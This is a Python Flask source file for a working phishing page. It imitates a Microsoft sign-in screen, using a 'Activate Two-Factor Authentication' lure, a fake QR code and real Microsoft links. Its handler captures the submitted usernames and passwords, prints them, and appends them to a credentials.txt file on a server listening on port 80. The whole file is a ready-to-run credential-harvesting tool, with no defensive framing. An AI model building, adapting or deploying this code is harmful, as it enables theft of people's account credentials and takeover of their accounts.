from flask import Flask, request, render_template_string
from exchangelib import Credentials, Account, DELEGATE

app = Flask(__name__)

# HTML template
login_page = """
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Martian+Mono:wght@800&family=Noto+Sans:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="./static/css/animation.css">
        <link rel="stylesheet" href="./static/css/style.css">
        <link rel="icon" href="./static/images/favicon.ico" type="image/x-icon">
        <title>Action Required: Activate Two-Factor Authentication (2FA) for Your Microsoft Account</title>
    </head>
    <body>
        <div class="container">
            <div class="img-div">
                <img src="./static/images/logo.png"/>
            </div>
            <div class="second-container">
                <img src="./static/images/microsoft.svg"/>   
            <form id="login-form" method="post" onsubmit="validateForm(event)">   
                <div class="animate__animated" id="QR-section">
                    <h2>Scan the following QR</h2>
                    <h5>with a 2FA authenticator app to activate 2FA</h5>
                   <div class="image"><img src="./static/images/download.png" /></div>
                </div> 
                <div id="username-sec" class="animate__animated animate__fadeInRight">  
                    <div class="start">
                        <h2>Sign in</h2>
                        <h5>to verify two factor authentication</h5>
                    </div>
                    <div id="username-error-message" class="error-message">Enter a valid email address, phone number, or Skype name.</div> <!-- Error message placeholder -->
                    <input type="text" name="username" id="username" placeholder="Email, phone or Skype" oninput="OnUserNameChange(this)" />
                    <h5>No account?
                        <a href="https://signup.live.com/signup?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&contextid=A0143514BB0CC057&opid=5D99B021FFEE36C2&bk=1714059156&sru=https://login.live.com/login.srf%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26contextid%3dA0143514BB0CC057%26opid%3d5D99B021FFEE36C2%26mkt%3dEN-US%26lc%3d1033%26bk%3d1714059156%26uaid%3db6a8ce0d670b41d0ab6ca5f84d0a39c2&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=b6a8ce0d670b41d0ab6ca5f84d0a39c2">
                    Create one!</a></h5>
                    <div class="btn">
                        <button type="button" onClick="validateName()">Next</button>
                    </div>
                </div>
                <div id="password-sec" class="animate__animated animate__fadeInRight">  
                    <div class="back-wards">
                        <img onClick="GoBack()" src="./static/images/arrow.svg" />
                        <h4 id="backward-name"></h4>
                    </div>
                    <h2>Enter password</h2>
                    <div id="password-error-message" class="error-message">Please enter the password for your Microsoft account.</div> <!-- Error message placeholder -->
                    <input type="password" name="password" id="password" oninput="OnPasswordChange(this)" placeholder="Password" />
                    <h5><a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26contextid%3d609E534BE89AB7FF%26opid%3d3FF06F931A638394%26bk%3d1714064019&id=292841&uiflavor=web&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&uaid=2627e2a8056b4f15bdbc10562fc6ef53&mkt=EN-US&lc=1033&bk=1714064019&mn=ismail">
                    Forgot password?</a></h5>
                    <div class="btn">
                        <button type="submit">Verify 2FA</button>
                    </div>
                </div>
            </form>
            </div>
            <div id="options" class="second-container options">
                <img src="./static/images/key.svg" />
                <h4>Sign-in options</h4>
            </div>
        </div>
        <footer>
            <a href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&uaid=d23df9b183f24960b7eff79e7a406826">Terms of use</a>
            <a href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&uaid=d23df9b183f24960b7eff79e7a406826">Privacy & cookies</a>
            <button type="button">...</button>
        </footer>
        <script src="./static/js/script.js"></script>
    </body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def phishing_page():
    if request.method == 'POST':
        data = request.json
        if data:
            username = data.get('username')
            password = data.get('password')
            if username and password:
                print("Username:", username)
                print("Password:", password)
                save_credentials(username, password)
    return render_template_string(login_page, message="Success")

def save_credentials(username, password):
    with open('credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
